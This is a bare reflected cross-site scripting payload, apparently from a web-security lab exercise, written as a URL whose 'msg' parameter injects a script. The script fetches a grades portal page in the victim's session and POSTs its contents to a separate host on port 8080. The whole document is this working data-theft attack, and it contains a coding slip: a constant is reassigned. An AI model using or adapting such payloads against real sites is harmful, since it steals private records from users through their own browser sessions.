http://192.168.1.203/task1ref.php?msg=<script>
(async () => {
    const url = '/gradesPortal.php';

    try {
        const response = await fetch(url);

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const data = await response.text();

        console.log('Success:', data);

        const my_url = 'http://192.168.1.201:8080';

        response = await fetch(my_url, {
            method: 'POST',
            body: data,
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

    } catch (error) {
        console.error('Fetch failed:', error);
        return null;
    }
})();

</script>
